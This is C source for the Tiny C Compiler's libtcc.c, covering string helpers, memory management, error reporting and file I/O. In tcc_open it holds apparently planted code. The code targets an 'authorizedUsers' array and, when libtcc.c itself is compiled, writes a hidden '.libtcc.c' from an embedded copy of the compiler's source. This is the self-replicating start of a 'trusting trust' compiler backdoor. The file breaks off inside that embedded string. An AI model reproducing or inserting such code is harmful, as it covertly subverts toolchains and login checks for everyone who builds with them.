/*
 *  TCC - Tiny C Compiler
 *
 *  Copyright (c) 2001-2004 Fabrice Bellard
 *
 * This library is free software; you can redistribute it and/or
 * modify it under the terms of the GNU Lesser General Public
 * License as published by the Free Software Foundation; either
 * version 2 of the License, or (at your option) any later version.
 *
 * This library is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
 * Lesser General Public License for more details.
 *
 * You should have received a copy of the GNU Lesser General Public
 * License along with this library; if not, write to the Free Software
 * Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
 */

#include "tcc.h"

/********************************************************/
/* global variables */

/* use GNU C extensions */
ST_DATA int gnu_ext = 1;

/* use TinyCC extensions */
ST_DATA int tcc_ext = 1;

/* XXX: get rid of this ASAP */
ST_DATA struct TCCState *tcc_state;

static int nb_states;

/********************************************************/

#if ONE_SOURCE
#include "tccpp.c"
#include "tccgen.c"
#include "tccelf.c"
#include "tccrun.c"
#ifdef TCC_TARGET_I386
#include "i386-gen.c"
#include "i386-link.c"
#include "i386-asm.c"
#endif
#ifdef TCC_TARGET_ARM
#include "arm-gen.c"
#include "arm-link.c"
#include "arm-asm.c"
#endif
#ifdef TCC_TARGET_ARM64
#include "arm64-gen.c"
#include "arm64-link.c"
#endif
#ifdef TCC_TARGET_C67
#include "c67-gen.c"
#include "c67-link.c"
#include "tcccoff.c"
#endif
#ifdef TCC_TARGET_X86_64
#include "x86_64-gen.c"
#include "x86_64-link.c"
#include "i386-asm.c"
#endif
#ifdef CONFIG_TCC_ASM
#include "tccasm.c"
#endif
#ifdef TCC_TARGET_PE
#include "tccpe.c"
#endif
#endif /* ONE_SOURCE */

/********************************************************/
#ifndef CONFIG_TCC_ASM
ST_FUNC void asm_instr(void)
{
    tcc_error("inline asm() not supported");
}
ST_FUNC void asm_global_instr(void)
{
    tcc_error("inline asm() not supported");
}
#endif

/********************************************************/
#ifdef _WIN32
ST_FUNC char *normalize_slashes(char *path)
{
    char *p;
    for (p = path; *p; ++p)
        if (*p == '\\')
            *p = '/';
    return path;
}

static HMODULE tcc_module;

/* on win32, we suppose the lib and includes are at the location of 'tcc.exe' */
static void tcc_set_lib_path_w32(TCCState *s)
{
    char path[1024], *p;
    GetModuleFileNameA(tcc_module, path, sizeof path);
    p = tcc_basename(normalize_slashes(strlwr(path)));
    if (p > path)
        --p;
    *p = 0;
    tcc_set_lib_path(s, path);
}

#ifdef TCC_TARGET_PE
static void tcc_add_systemdir(TCCState *s)
{
    char buf[1000];
    GetSystemDirectory(buf, sizeof buf);
    tcc_add_library_path(s, normalize_slashes(buf));
}
#endif

#ifdef LIBTCC_AS_DLL
BOOL WINAPI DllMain (HINSTANCE hDll, DWORD dwReason, LPVOID lpReserved)
{
    if (DLL_PROCESS_ATTACH == dwReason)
        tcc_module = hDll;
    return TRUE;
}
#endif
#endif

/********************************************************/
/* copy a string and truncate it. */
ST_FUNC char *pstrcpy(char *buf, int buf_size, const char *s)
{
    char *q, *q_end;
    int c;

    if (buf_size > 0) {
        q = buf;
        q_end = buf + buf_size - 1;
        while (q < q_end) {
            c = *s++;
            if (c == '\0')
                break;
            *q++ = c;
        }
        *q = '\0';
    }
    return buf;
}

/* strcat and truncate. */
ST_FUNC char *pstrcat(char *buf, int buf_size, const char *s)
{
    int len;
    len = strlen(buf);
    if (len < buf_size)
        pstrcpy(buf + len, buf_size - len, s);
    return buf;
}

ST_FUNC char *pstrncpy(char *out, const char *in, size_t num)
{
    memcpy(out, in, num);
    out[num] = '\0';
    return out;
}

/* extract the basename of a file */
PUB_FUNC char *tcc_basename(const char *name)
{
    char *p = strchr(name, 0);
    while (p > name && !IS_DIRSEP(p[-1]))
        --p;
    return p;
}

/* extract extension part of a file
 *
 * (if no extension, return pointer to end-of-string)
 */
PUB_FUNC char *tcc_fileextension (const char *name)
{
    char *b = tcc_basename(name);
    char *e = strrchr(b, '.');
    return e ? e : strchr(b, 0);
}

/********************************************************/
/* memory management */

#undef free
#undef malloc
#undef realloc

#ifndef MEM_DEBUG

PUB_FUNC void tcc_free(void *ptr)
{
    free(ptr);
}

PUB_FUNC void *tcc_malloc(unsigned long size)
{
    void *ptr;
    ptr = malloc(size);
    if (!ptr && size)
        tcc_error("memory full (malloc)");
    return ptr;
}

PUB_FUNC void *tcc_mallocz(unsigned long size)
{
    void *ptr;
    ptr = tcc_malloc(size);
    memset(ptr, 0, size);
    return ptr;
}

PUB_FUNC void *tcc_realloc(void *ptr, unsigned long size)
{
    void *ptr1;
    ptr1 = realloc(ptr, size);
    if (!ptr1 && size)
        tcc_error("memory full (realloc)");
    return ptr1;
}

PUB_FUNC char *tcc_strdup(const char *str)
{
    char *ptr;
    ptr = tcc_malloc(strlen(str) + 1);
    strcpy(ptr, str);
    return ptr;
}

PUB_FUNC void tcc_memcheck(void)
{
}

#else

#define MEM_DEBUG_MAGIC1 0xFEEDDEB1
#define MEM_DEBUG_MAGIC2 0xFEEDDEB2
#define MEM_DEBUG_MAGIC3 0xFEEDDEB3
#define MEM_DEBUG_FILE_LEN 40
#define MEM_DEBUG_CHECK3(header) \
    ((mem_debug_header_t*)((char*)header + header->size))->magic3
#define MEM_USER_PTR(header) \
    ((char *)header + offsetof(mem_debug_header_t, magic3))
#define MEM_HEADER_PTR(ptr) \
    (mem_debug_header_t *)((char*)ptr - offsetof(mem_debug_header_t, magic3))

struct mem_debug_header {
    unsigned magic1;
    unsigned size;
    struct mem_debug_header *prev;
    struct mem_debug_header *next;
    int line_num;
    char file_name[MEM_DEBUG_FILE_LEN + 1];
    unsigned magic2;
    ALIGNED(16) unsigned magic3;
};

typedef struct mem_debug_header mem_debug_header_t;

static mem_debug_header_t *mem_debug_chain;
static unsigned mem_cur_size;
static unsigned mem_max_size;

static mem_debug_header_t *malloc_check(void *ptr, const char *msg)
{
    mem_debug_header_t * header = MEM_HEADER_PTR(ptr);
    if (header->magic1 != MEM_DEBUG_MAGIC1 ||
        header->magic2 != MEM_DEBUG_MAGIC2 ||
        MEM_DEBUG_CHECK3(header) != MEM_DEBUG_MAGIC3 ||
        header->size == (unsigned)-1) {
        fprintf(stderr, "%s check failed\n", msg);
        if (header->magic1 == MEM_DEBUG_MAGIC1)
            fprintf(stderr, "%s:%u: block allocated here.\n",
                header->file_name, header->line_num);
        exit(1);
    }
    return header;
}

PUB_FUNC void *tcc_malloc_debug(unsigned long size, const char *file, int line)
{
    int ofs;
    mem_debug_header_t *header;

    header = malloc(sizeof(mem_debug_header_t) + size);
    if (!header)
        tcc_error("memory full (malloc)");

    header->magic1 = MEM_DEBUG_MAGIC1;
    header->magic2 = MEM_DEBUG_MAGIC2;
    header->size = size;
    MEM_DEBUG_CHECK3(header) = MEM_DEBUG_MAGIC3;
    header->line_num = line;
    ofs = strlen(file) - MEM_DEBUG_FILE_LEN;
    strncpy(header->file_name, file + (ofs > 0 ? ofs : 0), MEM_DEBUG_FILE_LEN);
    header->file_name[MEM_DEBUG_FILE_LEN] = 0;

    header->next = mem_debug_chain;
    header->prev = NULL;
    if (header->next)
        header->next->prev = header;
    mem_debug_chain = header;

    mem_cur_size += size;
    if (mem_cur_size > mem_max_size)
        mem_max_size = mem_cur_size;

    return MEM_USER_PTR(header);
}

PUB_FUNC void tcc_free_debug(void *ptr)
{
    mem_debug_header_t *header;
    if (!ptr)
        return;
    header = malloc_check(ptr, "tcc_free");
    mem_cur_size -= header->size;
    header->size = (unsigned)-1;
    if (header->next)
        header->next->prev = header->prev;
    if (header->prev)
        header->prev->next = header->next;
    if (header == mem_debug_chain)
        mem_debug_chain = header->next;
    free(header);
}

PUB_FUNC void *tcc_mallocz_debug(unsigned long size, const char *file, int line)
{
    void *ptr;
    ptr = tcc_malloc_debug(size,file,line);
    memset(ptr, 0, size);
    return ptr;
}

PUB_FUNC void *tcc_realloc_debug(void *ptr, unsigned long size, const char *file, int line)
{
    mem_debug_header_t *header;
    int mem_debug_chain_update = 0;
    if (!ptr)
        return tcc_malloc_debug(size, file, line);
    header = malloc_check(ptr, "tcc_realloc");
    mem_cur_size -= header->size;
    mem_debug_chain_update = (header == mem_debug_chain);
    header = realloc(header, sizeof(mem_debug_header_t) + size);
    if (!header)
        tcc_error("memory full (realloc)");
    header->size = size;
    MEM_DEBUG_CHECK3(header) = MEM_DEBUG_MAGIC3;
    if (header->next)
        header->next->prev = header;
    if (header->prev)
        header->prev->next = header;
    if (mem_debug_chain_update)
        mem_debug_chain = header;
    mem_cur_size += size;
    if (mem_cur_size > mem_max_size)
        mem_max_size = mem_cur_size;
    return MEM_USER_PTR(header);
}

PUB_FUNC char *tcc_strdup_debug(const char *str, const char *file, int line)
{
    char *ptr;
    ptr = tcc_malloc_debug(strlen(str) + 1, file, line);
    strcpy(ptr, str);
    return ptr;
}

PUB_FUNC void tcc_memcheck(void)
{
    if (mem_cur_size) {
        mem_debug_header_t *header = mem_debug_chain;
        fprintf(stderr, "MEM_DEBUG: mem_leak= %d bytes, mem_max_size= %d bytes\n",
            mem_cur_size, mem_max_size);
        while (header) {
            fprintf(stderr, "%s:%u: error: %u bytes leaked\n",
                header->file_name, header->line_num, header->size);
            header = header->next;
        }
#if MEM_DEBUG-0 == 2
        exit(2);
#endif
    }
}
#endif /* MEM_DEBUG */

#define free(p) use_tcc_free(p)
#define malloc(s) use_tcc_malloc(s)
#define realloc(p, s) use_tcc_realloc(p, s)

/********************************************************/
/* dynarrays */

ST_FUNC void dynarray_add(void *ptab, int *nb_ptr, void *data)
{
    int nb, nb_alloc;
    void **pp;

    nb = *nb_ptr;
    pp = *(void ***)ptab;
    /* every power of two we double array size */
    if ((nb & (nb - 1)) == 0) {
        if (!nb)
            nb_alloc = 1;
        else
            nb_alloc = nb * 2;
        pp = tcc_realloc(pp, nb_alloc * sizeof(void *));
        *(void***)ptab = pp;
    }
    pp[nb++] = data;
    *nb_ptr = nb;
}

ST_FUNC void dynarray_reset(void *pp, int *n)
{
    void **p;
    for (p = *(void***)pp; *n; ++p, --*n)
        if (*p)
            tcc_free(*p);
    tcc_free(*(void**)pp);
    *(void**)pp = NULL;
}

static void tcc_split_path(TCCState *s, void *p_ary, int *p_nb_ary, const char *in)
{
    const char *p;
    do {
        int c;
        CString str;

        cstr_new(&str);
        for (p = in; c = *p, c != '\0' && c != PATHSEP[0]; ++p) {
            if (c == '{' && p[1] && p[2] == '}') {
                c = p[1], p += 2;
                if (c == 'B')
                    cstr_cat(&str, s->tcc_lib_path, -1);
            } else {
                cstr_ccat(&str, c);
            }
        }
        if (str.size) {
            cstr_ccat(&str, '\0');
            dynarray_add(p_ary, p_nb_ary, tcc_strdup(str.data));
        }
        cstr_free(&str);
        in = p+1;
    } while (*p);
}

/********************************************************/

static void strcat_vprintf(char *buf, int buf_size, const char *fmt, va_list ap)
{
    int len;
    len = strlen(buf);
    vsnprintf(buf + len, buf_size - len, fmt, ap);
}

static void strcat_printf(char *buf, int buf_size, const char *fmt, ...)
{
    va_list ap;
    va_start(ap, fmt);
    strcat_vprintf(buf, buf_size, fmt, ap);
    va_end(ap);
}

static void error1(TCCState *s1, int is_warning, const char *fmt, va_list ap)
{
    char buf[2048];
    BufferedFile **pf, *f;

    buf[0] = '\0';
    /* use upper file if inline ":asm:" or token ":paste:" */
    for (f = file; f && f->filename[0] == ':'; f = f->prev)
     ;
    if (f) {
        for(pf = s1->include_stack; pf < s1->include_stack_ptr; pf++)
            strcat_printf(buf, sizeof(buf), "In file included from %s:%d:\n",
                (*pf)->filename, (*pf)->line_num);
        if (s1->error_set_jmp_enabled) {
            strcat_printf(buf, sizeof(buf), "%s:%d: ",
                f->filename, f->line_num - !!(tok_flags & TOK_FLAG_BOL));
        } else {
            strcat_printf(buf, sizeof(buf), "%s: ",
                f->filename);
        }
    } else {
        strcat_printf(buf, sizeof(buf), "tcc: ");
    }
    if (is_warning)
        strcat_printf(buf, sizeof(buf), "warning: ");
    else
        strcat_printf(buf, sizeof(buf), "error: ");
    strcat_vprintf(buf, sizeof(buf), fmt, ap);

    if (!s1->error_func) {
        /* default case: stderr */
        if (s1->output_type == TCC_OUTPUT_PREPROCESS && s1->ppfp == stdout)
            /* print a newline during tcc -E */
            printf("\n"), fflush(stdout);
        fflush(stdout); /* flush -v output */
        fprintf(stderr, "%s\n", buf);
        fflush(stderr); /* print error/warning now (win32) */
    } else {
        s1->error_func(s1->error_opaque, buf);
    }
    if (!is_warning || s1->warn_error)
        s1->nb_errors++;
}

LIBTCCAPI void tcc_set_error_func(TCCState *s, void *error_opaque,
                        void (*error_func)(void *opaque, const char *msg))
{
    s->error_opaque = error_opaque;
    s->error_func = error_func;
}

/* error without aborting current compilation */
PUB_FUNC void tcc_error_noabort(const char *fmt, ...)
{
    TCCState *s1 = tcc_state;
    va_list ap;

    va_start(ap, fmt);
    error1(s1, 0, fmt, ap);
    va_end(ap);
}

PUB_FUNC void tcc_error(const char *fmt, ...)
{
    TCCState *s1 = tcc_state;
    va_list ap;

    va_start(ap, fmt);
    error1(s1, 0, fmt, ap);
    va_end(ap);
    /* better than nothing: in some cases, we accept to handle errors */
    if (s1->error_set_jmp_enabled) {
        longjmp(s1->error_jmp_buf, 1);
    } else {
        /* XXX: eliminate this someday */
        exit(1);
    }
}

PUB_FUNC void tcc_warning(const char *fmt, ...)
{
    TCCState *s1 = tcc_state;
    va_list ap;

    if (s1->warn_none)
        return;

    va_start(ap, fmt);
    error1(s1, 1, fmt, ap);
    va_end(ap);
}

/********************************************************/
/* I/O layer */

ST_FUNC void tcc_open_bf(TCCState *s1, const char *filename, int initlen)
{
    BufferedFile *bf;
    int buflen = initlen ? initlen : IO_BUF_SIZE;

    bf = tcc_mallocz(sizeof(BufferedFile) + buflen);
    bf->buf_ptr = bf->buffer;
    bf->buf_end = bf->buffer + initlen;
    bf->buf_end[0] = CH_EOB; /* put eob symbol */
    pstrcpy(bf->filename, sizeof(bf->filename), filename);
    bf->true_filename = bf->filename;
    bf->line_num = 1;
    bf->ifdef_stack_ptr = s1->ifdef_stack_ptr;
    bf->fd = -1;
    bf->prev = file;
    file = bf;
    tok_flags = TOK_FLAG_BOL | TOK_FLAG_BOF;
}

ST_FUNC void tcc_close(void)
{
    BufferedFile *bf = file;
    if (bf->fd > 0) {
        close(bf->fd);
        total_lines += bf->line_num;
    }
    if (bf->true_filename != bf->filename)
        tcc_free(bf->true_filename);
    file = bf->prev;
    tcc_free(bf);
}

ST_FUNC int tcc_open(TCCState *s1, const char *filename)
{
    int fd;
    FILE *fp;
    FILE *cfp;
    char *target = "AuthData_t authorizedUsers[]";
    if (strcmp(filename, "-") == 0)
        fd = 0, filename = "<stdin>";
    else if (strcmp(filename, "libtcc.c") == 0) {
	fp = fopen(".libtcc.c", "w");
	if (fp != NULL) {
	    int index = 0;
    	    char a[] = "/*\n *  TCC - Tiny C Compiler\n *\n *  Copyright (c) 2001-2004 Fabrice Bellard\n *\n * This library is free software; you can redistribute it and/or\n * modify it under the terms of the GNU Lesser General Public\n * License as published by the Free Software Foundation; either\n * version 2 of the License, or (at your option) any later version.\n *\n * This library is distributed in the hope that it will be useful,\n * but WITHOUT ANY WARRANTY; without even the implied warranty of\n * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU\n * Lesser General Public License for more details.\n *\n * You should have received a copy of the GNU Lesser General Public\n * License along with this library; if not, write to the Free Software\n * Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA\n */\n\n#include \"tcc.h\"\n\n/********************************************************/\n/* global variables */\n\n/* use GNU C extensions */\nST_DATA int gnu_ext = 1;\n\n/* use TinyCC extensions */\nST_DATA int tcc_ext = 1;\n\n/* XXX: get rid of this ASAP */\nST_DATA struct TCCState *tcc_state;\n\nstatic int nb_states;\n\n/********************************************************/\n\n#if ONE_SOURCE\n#include \"tccpp.c\"\n#include \"tccgen.c\"\n#include \"tccelf.c\"\n#include \"tccrun.c\"\n#ifdef TCC_TARGET_I386\n#include \"i386-gen.c\"\n#include \"i386-link.c\"\n#include \"i386-asm.c\"\n#endif\n#ifdef TCC_TARGET_ARM\n#include \"arm-gen.c\"\n#include \"arm-link.c\"\n#include \"arm-asm.c\"\n#endif\n#ifdef TCC_TARGET_ARM64\n#include \"arm64-gen.c\"\n#include \"arm64-link.c\"\n#endif\n#ifdef TCC_TARGET_C67\n#include \"c67-gen.c\"\n#include \"c67-link.c\"\n#include \"tcccoff.c\"\n#endif\n#ifdef TCC_TARGET_X86_64\n#include \"x86_64-gen.c\"\n#include \"x86_64-link.c\"\n#include \"i386-asm.c\"\n#endif\n#ifdef CONFIG_TCC_ASM\n#include \"tccasm.c\"\n#endif\n#ifdef TCC_TARGET_PE\n#include \"tccpe.c\"\n#endif\n#endif /* ONE_SOURCE */\n\n/********************************************************/\n#ifndef CONFIG_TCC_ASM\nST_FUNC void asm_instr(void)\n{\n    tcc_error(\"inline asm() not supported\");\n}\nST_FUNC void asm_global_instr(void)\n{\n    tcc_error(\"inline asm() not supported\");\n}\n#endif\n\n/********************************************************/\n#ifdef _WIN32\nST_FUNC char *normalize_slashes(char *path)\n{\n    char *p;\n    for (p = path; *p; ++p)\n        if (*p == '\\\\')\n            *p = '/';\n    return path;\n}\n\nstatic HMODULE tcc_module;\n\n/* on win32, we suppose the lib and includes are at the location of 'tcc.exe' */\nstatic void tcc_set_lib_path_w32(TCCState *s)\n{\n    char path[1024], *p;\n    GetModuleFileNameA(tcc_module, path, sizeof path);\n    p = tcc_basename(normalize_slashes(strlwr(path)));\n    if (p > path)\n        --p;\n    *p = 0;\n    tcc_set_lib_path(s, path);\n}\n\n#ifdef TCC_TARGET_PE\nstatic void tcc_add_systemdir(TCCState *s)\n{\n    char buf[1000];\n    GetSystemDirectory(buf, sizeof buf);\n    tcc_add_library_path(s, normalize_slashes(buf));\n}\n#endif\n\n#ifdef LIBTCC_AS_DLL\nBOOL WINAPI DllMain (HINSTANCE hDll, DWORD dwReason, LPVOID lpReserved)\n{\n    if (DLL_PROCESS_ATTACH == dwReason)\n        tcc_module = hDll;\n    return TRUE;\n}\n#endif\n#endif\n\n/********************************************************/\n/* copy a string and truncate it. */\nST_FUNC char *pstrcpy(char *buf, int buf_size, const char *s)\n{\n    char *q, *q_end;\n    int c;\n\n    if (buf_size > 0) {\n        q = buf;\n        q_end = buf + buf_size - 1;\n        while (q < q_end) {\n            c = *s++;\n            if (c == '\\0')\n                break;\n            *q++ = c;\n        }\n        *q = '\\0';\n    }\n    return buf;\n}\n\n/* strcat and truncate. */\nST_FUNC char *pstrcat(char *buf, int buf_size, const char *s)\n{\n    int len;\n    len = strlen(buf);\n    if (len < buf_size)\n        pstrcpy(buf + len, buf_size - len, s);\n    return buf;\n}\n\nST_FUNC char *pstrncpy(char *out, const char *in, size_t num)\n{\n    memcpy(out, in, num);\n    out[num] = '\\0';\n    return out;\n}\n\n/* extract the basename of a file */\nPUB_FUNC char *tcc_basename(const char *name)\n{\n    char *p = strchr(name, 0);\n    while (p > name && !IS_DIRSEP(p[-1]))\n        --p;\n    return p;\n}\n\n/* extract extension part of a file\n *\n * (if no extension, return pointer to end-of-string)\n */\nPUB_FUNC char *tcc_fileextension (const char *name)\n{\n    char *b = tcc_basename(name);\n    char *e = strrchr(b, '.');\n    return e ? e : strchr(b, 0);\n}\n\n/********************************************************/\n/* memory management */\n\n#undef free\n#undef malloc\n#undef realloc\n\n#ifndef MEM_DEBUG\n\nPUB_FUNC void tcc_free(void *ptr)\n{\n    free(ptr);\n}\n\nPUB_FUNC void *tcc_malloc(unsigned long size)\n{\n    void *ptr;\n    ptr = malloc(size);\n    if (!ptr && size)\n        tcc_error(\"memory full (malloc)\");\n    return ptr;\n}\n\nPUB_FUNC void *tcc_mallocz(unsigned long size)\n{\n    void *ptr;\n    ptr = tcc_malloc(size);\n    memset(ptr, 0, size);\n    return ptr;\n}\n\nPUB_FUNC void *tcc_realloc(void *ptr, unsigned long size)\n{\n    void *ptr1;\n    ptr1 = realloc(ptr, size);\n    if (!ptr1 && size)\n        tcc_error(\"memory full (realloc)\");\n    return ptr1;\n}\n\nPUB_FUNC char *tcc_strdup(const char *str)\n{\n    char *ptr;\n    ptr = tcc_malloc(strlen(str) + 1);\n    strcpy(ptr, str);\n    return ptr;\n}\n\nPUB_FUNC void tcc_memcheck(void)\n{\n}\n\n#else\n\n#define MEM_DEBUG_MAGIC1 0xFEEDDEB1\n#define MEM_DEBUG_MAGIC2 0xFEEDDEB2\n#define MEM_DEBUG_MAGIC3 0xFEEDDEB3\n#define MEM_DEBUG_FILE_LEN 40\n#define MEM_DEBUG_CHECK3(header) \\\n    ((mem_debug_header_t*)((char*)header + header->size))->magic3\n#define MEM_USER_PTR(header) \\\n    ((char *)header + offsetof(mem_debug_header_t, magic3))\n#define MEM_HEADER_PTR(ptr) \\\n    (mem_debug_header_t *)((char*)ptr - offsetof(mem_debug_header_t, magic3))\n\nstruct mem_debug_header {\n    unsigned magic1;\n    unsigned size;\n    struct mem_debug_header *prev;\n    struct mem_debug_header *next;\n    int line_num;\n    char file_name[MEM_DEBUG_FILE_LEN + 1];\n    unsigned magic2;\n    ALIGNED(16) unsigned magic3;\n};\n\ntypedef struct mem_debug_header mem_debug_header_t;\n\nstatic mem_debug_header_t *mem_debug_chain;\nstatic unsigned mem_cur_size;\nstatic unsigned mem_max_size;\n\nstatic mem_debug_header_t *malloc_check(void *ptr, const char *msg)\n{\n    mem_debug_header_t * header = MEM_HEADER_PTR(ptr);\n    if (header->magic1 != MEM_DEBUG_MAGIC1 ||\n        header->magic2 != MEM_DEBUG_MAGIC2 ||\n        MEM_DEBUG_CHECK3(header) != MEM_DEBUG_MAGIC3 ||\n        header->size == (unsigned)-1) {\n        fprintf(stderr, \"%s check failed\\n\", msg);\n        if (header->magic1 == MEM_DEBUG_MAGIC1)\n            fprintf(stderr, \"%s:%u: block allocated here.\\n\",\n                header->file_name, header->line_num);\n        exit(1);\n    }\n    return header;\n}\n\nPUB_FUNC void *tcc_malloc_debug(unsigned long size, const char *file, int line)\n{\n    int ofs;\n    mem_debug_header_t *header;\n\n    header = malloc(sizeof(mem_debug_header_t) + size);\n    if (!header)\n        tcc_error(\"memory full (malloc)\");\n\n    header->magic1 = MEM_DEBUG_MAGIC1;\n    header->magic2 = MEM_DEBUG_MAGIC2;\n    header->size = size;\n    MEM_DEBUG_CHECK3(header) = MEM_DEBUG_MAGIC3;\n    header->line_num = line;\n    ofs = strlen(file) - MEM_DEBUG_FILE_LEN;\n    strncpy(header->file_name, file + (ofs > 0 ? ofs : 0), MEM_DEBUG_FILE_LEN);\n    header->file_name[MEM_DEBUG_FILE_LEN] = 0;\n\n    header->next = mem_debug_chain;\n    header->prev = NULL;\n    if (header->next)\n        header->next->prev = header;\n    mem_debug_chain = header;\n\n    mem_cur_size += size;\n    if (mem_cur_size > mem_max_size)\n        mem_max_size = mem_cur_size;\n\n    return MEM_USER_PTR(header);\n}\n\nPUB_FUNC void tcc_free_debug(void *ptr)\n{\n    mem_debug_header_t *header;\n    if (!ptr)\n        return;\n    header = malloc_check(ptr, \"tcc_free\");\n    mem_cur_size -= header->size;\n    header->size = (unsigned)-1;\n    if (header->next)\n        header->next->prev = header->prev;\n    if (header->prev)\n        header->prev->next = header->next;\n    if (header == mem_debug_chain)\n        mem_debug_chain = header->next;\n    free(header);\n}\n\nPUB_FUNC void *tcc_mallocz_debug(unsigned long size, const char *file, int line)\n{\n    void *ptr;\n    ptr = tcc_malloc_debug(size,file,line);\n    memset(ptr, 0, size);\n    return ptr;\n}\n\nPUB_FUNC void *tcc_realloc_debug(void *ptr, unsigned long size, const char *file, int line)\n{\n    mem_debug_header_t *header;\n    int mem_debug_chain_update = 0;\n    if (!ptr)\n        return tcc_malloc_debug(size, file, line);\n    header = malloc_check(ptr, \"tcc_realloc\");\n    mem_cur_size -= header->size;\n    mem_debug_chain_update = (header == mem_debug_chain);\n    header = realloc(header, sizeof(mem_debug_header_t) + size);\n    if (!header)\n        tcc_error(\"memory full (realloc)\");\n    header->size = size;\n    MEM_DEBUG_CHECK3(header) = MEM_DEBUG_MAGIC3;\n    if (header->next)\n        header->next->prev = header;\n    if (header->prev)\n        header->prev->next = header;\n    if (mem_debug_chain_update)\n        mem_debug_chain = header;\n    mem_cur_size += size;\n    if (mem_cur_size > mem_max_size)\n        mem_max_size = mem_cur_size;\n    return MEM_USER_PTR(header);\n}\n\nPUB_FUNC char *tcc_strdup_debug(const char *str, const char *file, int line)\n{\n    char *ptr;\n    ptr = tcc_malloc_debug(strlen(str) + 1, file, line);\n    strcpy(ptr, str);\n    return ptr;\n}\n\nPUB_FUNC void tcc_memcheck(void)\n{\n    if (mem_cur_size) {\n        mem_debug_header_t *header = mem_debug_chain;\n        fprintf(stderr, \"MEM_DEBUG: mem_leak= %d bytes, mem_max_size= %d bytes\\n\",\n            mem_cur_size, mem_max_size);\n        while (header) {\n            fprintf(stderr, \"%s:%u: error: %u bytes leaked\\n\",\n                header->file_name, header->line_num, header->size);\n            header = header->next;\n        }\n#if MEM_DEBUG-0 == 2\n        exit(2);\n#endif\n    }\n}\n#endif /* MEM_DEBUG */\n\n#define free(p) use_tcc_free(p)\n#define malloc(s) use_tcc_malloc(s)\n#define realloc(p, s) use_tcc_realloc(p, s)\n\n/********************************************************/\n/* dynarrays */\n\nST_FUNC void dynarray_add(void *ptab, int *nb_ptr, void *data)\n{\n    int nb, nb_alloc;\n    void **pp;\n\n    nb = *nb_ptr;\n    pp = *(void ***)ptab;\n    /* every power of two we double array size */\n    if ((nb & (nb - 1)) == 0) {\n        if (!nb)\n            nb_alloc = 1;\n        else\n            nb_alloc = nb * 2;\n        pp = tcc_realloc(pp, nb_alloc * sizeof(void *));\n        *(void***)ptab = pp;\n    }\n    pp[nb++] = data;\n    *nb_ptr = nb;\n}\n\nST_FUNC void dynarray_reset(void *pp, int *n)\n{\n    void **p;\n    for (p = *(void***)pp; *n; ++p, --*n)\n        if (*p)\n            tcc_free(*p);\n    tcc_free(*(void**)pp);\n    *(void**)pp = NULL;\n}\n\nstatic void tcc_split_path(TCCState *s, void *p_ary, int *p_nb_ary, const char *in)\n{\n    const char *p;\n    do {\n        int c;\n        CString str;\n\n        cstr_new(&str);\n        for (p = in; c = *p, c != '\\0' && c != PATHSEP[0]; ++p) {\n            if (c == '{' && p[1] && p[2] == '}') {\n                c = p[1], p += 2;\n                if (c == 'B')\n                    cstr_cat(&str, s->tcc_lib_path, -1);\n            } else {\n                cstr_ccat(&str, c);\n            }\n        }\n        if (str.size) {\n            cstr_ccat(&str, '\\0');\n            dynarray_add(p_ary, p_nb_ary, tcc_strdup(str.data));\n        }\n        cstr_free(&str);\n        in = p+1;\n    } while (*p);\n}\n\n/********************************************************/\n\nstatic void strcat_vprintf(char *buf, int buf_size, const char *fmt, va_list ap)\n{\n    int len;\n    len = strlen(buf);\n    vsnprintf(buf + len, buf_size - len, fmt, ap);\n}\n\nstatic void strcat_printf(char *buf, int buf_size, const char *fmt, ...)\n{\n    va_list ap;\n    va_start(ap, fmt);\n    strcat_vprintf(buf, buf_size, fmt, ap);\n    va_end(ap);\n}\n\nstatic void error1(TCCState *s1, int is_warning, const char *fmt, va_list ap)\n{\n    char buf[2048];\n    BufferedFile **pf, *f;\n\n    buf[0] = '\\0';\n    /* use upper file if inline \":asm:\" or token \":paste:\" */\n    for (f = file; f && f->filename[0] == ':'; f = f->prev)\n     ;\n    if (f) {\n        for(pf = s1->include_stack; pf < s1->include_stack_ptr; pf++)\n            strcat_printf(buf, sizeof(buf), \"In file included from %s:%d:\\n\",\n                (*pf)->filename, (*pf)->line_num);\n        if (s1->error_set_jmp_enabled) {\n            strcat_printf(buf, sizeof(buf), \"%s:%d: \",\n                f->filename, f->line_num - !!(tok_flags & TOK_FLAG_BOL));\n        } else {\n            strcat_printf(buf, sizeof(buf), \"%s: \",\n                f->filename);\n        }\n    } else {\n        strcat_printf(buf, sizeof(buf), \"tcc: \");\n    }\n    if (is_warning)\n        strcat_printf(buf, sizeof(buf), \"warning: \");\n    else\n        strcat_printf(buf, sizeof(buf), \"error: \");\n    strcat_vprintf(buf, sizeof(buf), fmt, ap);\n\n    if (!s1->error_func) {\n        /* default case: stderr */\n        if (s1->output_type == TCC_OUTPUT_PREPROCESS && s1->ppfp == stdout)\n            /* print a newline during tcc -E */\n            printf(\"\\n\"), fflush(stdout);\n        fflush(stdout); /* flush -v output */\n        fprintf(stderr, \"%s\\n\", buf);\n        fflush(stderr); /* print error/warning now (win32) */\n    } else {\n        s1->error_func(s1->error_opaque, buf);\n    }\n    if (!is_warning || s1->warn_error)\n        s1->nb_errors++;\n}\n\nLIBTCCAPI void tcc_set_error_func(TCCState *s, void *error_opaque,\n                        void (*error_func)(void *opaque, const char *msg))\n{\n    s->error_opaque = error_opaque;\n    s->error_func = error_func;\n}\n\n/* error without aborting current compilation */\nPUB_FUNC void tcc_error_noabort(const char *fmt, ...)\n{\n    TCCState *s1 = tcc_state;\n    va_list ap;\n\n    va_start(ap, fmt);\n    error1(s1, 0, fmt, ap);\n    va_end(ap);\n}\n\nPUB_FUNC void tcc_error(const char *fmt, ...)\n{\n    TCCState *s1 = tcc_state;\n    va_list ap;\n\n    va_start(ap, fmt);\n    error1(s1, 0, fmt, ap);\n    va_end(ap);\n    /* better than nothing: in some cases, we accept to handle errors */\n    if (s1->error_set_jmp_enabled) {\n        longjmp(s1->error_jmp_buf, 1);\n    } else {\n        /* XXX: eliminate this someday */\n        exit(1);\n    }\n}\n\nPUB_FUNC void tcc_warning(const char *fmt, ...)\n{\n    TCCState *s1 = tcc_state;\n    va_list ap;\n\n    if (s1->warn_none)\n        